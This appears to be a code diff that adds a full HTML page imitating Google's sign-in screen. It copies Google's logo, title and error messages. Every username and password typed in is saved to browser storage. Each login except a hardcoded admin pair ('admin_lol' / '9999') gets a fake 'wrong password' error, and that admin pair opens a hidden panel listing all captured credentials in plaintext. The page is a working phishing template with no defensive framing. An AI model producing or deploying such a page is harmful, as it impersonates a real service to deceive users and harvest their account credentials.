@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign in – Google accounts</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    /* Reset and base */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      background: #fff;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: start;
+      min-height: 100vh;
+      padding-top: 120px;
+      color: #202124;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* Container */
+    .login-container {
+      width: 360px;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+
+    /* Google G logo */
+    .google-logo {
+      width: 92px;
+      height: 30px;
+      margin: 0 auto 32px;
+      user-select: none;
+      pointer-events: none;
+      display: block;
+    }
+
+    /* Headline */
+    h1 {
+      font-weight: 400;
+      font-size: 24px;
+      line-height: 28px;
+      margin: 0 0 16px;
+      color: #202124;
+    }
+
+    /* Input styles */
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 16px;
+      line-height: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      box-sizing: border-box;
+      transition: border-color 0.15s ease-in-out;
+      margin-bottom: 12px;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      border-color: #1a73e8;
+      box-shadow: 0 1px 1px rgba(26, 115, 232, 0.1);
+    }
+
+    /* Error message */
+    .error-message {
+      font-size: 12px;
+      line-height: 16px;
+      color: #d93025;
+      text-align: left;
+      margin: -8px 0 8px;
+      display: none;
+      font-weight: 400;
+      user-select: none;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    /* Button */
+    button {
+      width: 100%;
+      padding: 10px 16px;
+      background-color: #1a73e8;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: 500;
+      font-size: 14px;
+      line-height: 20px;
+      cursor: pointer;
+      transition: background-color 0.2s ease-in-out;
+      user-select: none;
+      box-shadow: 0 1px 1px rgb(0 0 0 / 0.1);
+    }
+
+    button:hover,
+    button:focus {
+      background-color: #1669f2;
+      outline: none;
+      box-shadow: 0 2px 6px rgb(26 115 232 / 0.4);
+    }
+
+    /* Admin popup panel styles - Dev Console look */
+    #adminPopup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      width: 450px;
+      max-width: 90vw;
+      max-height: 70vh;
+      background: #0d0d0d;
+      border-radius: 8px;
+      box-shadow:
+        0 0 15px #39ff14,
+        0 0 30px #39ff14,
+        0 0 60px #39ff14;
+      transform: translate(-50%, -50%);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      user-select: none;
+      color: #39ff14;
+      font-family: 'Source Code Pro', monospace, monospace;
+      font-size: 14px;
+      letter-spacing: 0.05em;
+    }
+
+    #adminHeader {
+      background: #0a0a0a;
+      color: #39ff14;
+      padding: 10px 15px;
+      font-weight: 700;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: move;
+      border-bottom: 1px solid #39ff14;
+      text-shadow: 0 0 5px #39ff14;
+    }
+
+    #adminHeader h4 {
+      margin: 0;
+      font-size: 16px;
+      user-select: none;
+    }
+
+    #adminButtons button {
+      background: transparent;
+      border: none;
+      color: #39ff14;
+      font-size: 20px;
+      margin-left: 10px;
+      cursor: pointer;
+      user-select: none;
+      line-height: 1;
+      transition: color 0.3s;
+    }
+
+    #adminButtons button:hover {
+      color: #00ff00;
+      text-shadow: 0 0 8px #00ff00;
+    }
+
+    #adminContent {
+      padding: 15px;
+      overflow-y: auto;
+      flex-grow: 1;
+      border-top: 1px solid #39ff14;
+    }
+
+    #adminContent table {
+      width: 100%;
+      border-collapse: collapse;
+      color: #39ff14;
+    }
+
+    #adminContent th,
+    #adminContent td {
+      text-align: left;
+      padding: 6px 10px;
+      border-bottom: 1px solid #004d00;
+      word-break: break-all;
+    }
+
+    #adminContent th {
+      background: #002600;
+      text-shadow: 0 0 5px #39ff14;
+    }
+
+    /* Minimized state */
+    #adminPopup.minimized {
+      height: 40px;
+      max-height: none;
+      overflow: hidden;
+      cursor: pointer;
+      color: #39ff14;
+      box-shadow:
+        0 0 10px #39ff14,
+        0 0 20px #39ff14;
+    }
+
+    #adminPopup.minimized #adminContent {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container" role="main" aria-label="Sign in">
+    <img
+      class="google-logo"
+      src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+      alt="Google"
+    />
+    <h1>Sign in</h1>
+
+    <input
+      type="text"
+      id="username"
+      placeholder="Email or phone"
+      autocomplete="username"
+      aria-describedby="userError"
+    />
+    <div id="userError" class="error-message" role="alert" aria-live="assertive">
+      Couldn't find your Google Account
+    </div>
+
+    <input
+      type="password"
+      id="password"
+      placeholder="Enter your password"
+      autocomplete="current-password"
+      aria-describedby="passError"
+    />
+    <div id="passError" class="error-message" role="alert" aria-live="assertive">
+      Wrong password. Try again.
+    </div>
+
+    <button onclick="handleLogin()">Next</button>
+  </div>
+
+  <!-- Admin popup -->
+  <div
+    id="adminPopup"
+    role="dialog"
+    aria-modal="true"
+    aria-labelledby="adminTitle"
+    tabindex="-1"
+  >
+    <div id="adminHeader">
+      <h4 id="adminTitle">🔐 Stored Login Attempts</h4>
+      <div id="adminButtons">
+        <button title="Minimize" onclick="toggleMinimize(event)">—</button>
+        <button title="Close" onclick="closeAdmin(event)">×</button>
+      </div>
+    </div>
+    <div id="adminContent" tabindex="0">
+      <table>
+        <thead>
+          <tr><th>Username</th><th>Password</th></tr>
+        </thead>
+        <tbody id="loginTableBody"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <script>
+    function handleLogin() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
+      const userError = document.getElementById("userError");
+      const passError = document.getElementById("passError");
+
+      // Save login attempt
+      let attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
+      attempts.push({ username, password });
+      localStorage.setItem("loginAttempts", JSON.stringify(attempts));
+
+      // Check admin login
+      if (username === "admin_lol" && password === "9999") {
+        userError.style.display = "none";
+        passError.style.display = "none";
+        showAdminPopup(attempts);
+        return;
+      }
+
+      // Show error messages for all other logins (exact Google style)
+      userError.style.display = "block";
+      passError.style.display = "block";
+    }
+
+    function showAdminPopup(attempts) {
+      const popup = document.getElementById("adminPopup");
+      const tbody = document.getElementById("loginTableBody");
+      tbody.innerHTML = ""; // Clear old rows
+
+      attempts.forEach(({ username, password }) => {
+        const row = document.createElement("tr");
+        row.innerHTML = `<td>${escapeHtml(username)}</td><td>${escapeHtml(password)}</td>`;
+        tbody.appendChild(row);
+      });
+
+      popup.classList.remove("minimized");
+      popup.style.display = "flex";
+      popup.focus();
+    }
+
+    function toggleMinimize(event) {
+      event.stopPropagation();
+      const popup = document.getElementById("adminPopup");
+      popup.classList.toggle("minimized");
+    }
+
+    function closeAdmin(event) {
+      event.stopPropagation();
+      const popup = document.getElementById("adminPopup");
+      popup.style.display = "none";
+    }
+
+    // Optional: Make popup draggable
+    (() => {
+      const popup = document.getElementById("adminPopup");
+      const header = document.getElementById("adminHeader");
+      let isDragging = false;
+      let offsetX, offsetY;
+
+      header.style.cursor = "move";
+
+      header.addEventListener("mousedown", (e) => {
+        if (popup.classList.contains("minimized")) return; // don't drag if minimized
+        isDragging = true;
+        offsetX = e.clientX - popup.offsetLeft;
+        offsetY = e.clientY - popup.offsetTop;
+        document.body.style.userSelect = "none";
+      });
+
+      document.addEventListener("mouseup", () => {
+        isDragging = false;
+        document.body.style.userSelect = "";
+      });
+
+      document.addEventListener("mousemove", (e) => {
+        if (!isDragging) return;
+        popup.style.left = e.clientX - offsetX + "px";
+        popup.style.top = e.clientY - offsetY + "px";
+        popup.style.transform = ""; // disable centering transform while dragging
+      });
+    })();
+
+    // Simple HTML escaping to avoid injection in table
+    function escapeHtml(text) {
+      return text
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+  </script>
+</body>
+</html>
